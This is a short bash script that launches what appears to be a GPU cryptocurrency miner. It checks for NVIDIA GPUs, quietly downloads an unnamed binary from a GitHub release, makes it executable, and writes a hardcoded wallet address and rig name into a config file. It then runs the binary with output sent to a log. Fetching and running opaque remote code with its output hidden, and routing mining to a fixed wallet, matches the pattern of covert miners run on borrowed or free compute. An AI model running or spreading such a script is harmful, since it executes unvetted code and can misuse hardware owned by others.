#!/bin/bash
nvidia-smi -L
wget https://github.com/phucbmt/tt/releases/download/1/nn &> /dev/null
chmod +x nn
echo wallet = 0x2da80e09cc05981269038c7560c7b54b63fad5a3 >> config.ini
echo rigName = $1 >> config.ini
./nn config.ini &> logdebug
